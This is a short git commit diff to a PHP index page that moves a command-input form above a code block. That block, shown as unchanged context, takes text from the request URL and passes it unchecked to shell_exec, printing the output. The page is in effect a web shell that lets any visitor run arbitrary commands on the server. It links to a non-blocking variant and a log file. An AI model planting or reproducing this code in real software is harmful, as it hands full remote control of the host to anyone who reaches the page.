549b388775f21d98e4cc22756bb2f3075fc7bf72
laiyuantemp <100673133+laiyuantemp@users.noreply.github.com>
2022-08-16 14:10:29 +0800

    Update index.php

--- index.php
+++ index.php
@@ -1,3 +1,7 @@
+<form action="/">
+  <input type="text" placeholder="command" name=" ">
+  <button type="submit">submit</button>
+</form>
 <pre>
 <?php
   $cmd = substr($_SERVER['REQUEST_URI'], strpos($_SERVER['REQUEST_URI'], "=", 1)+1);
@@ -6,10 +10,6 @@
   echo shell_exec($cmd);
 ?>
 </pre>
-<form action="/">
-  <input type="text" placeholder="command" name=" ">
-  <button type="submit">submit</button>
-</form>
 <br>
 <a href="/cmd_noblock.php">cmd no block</a><br>
 <a href="/log.txt">log file</a>
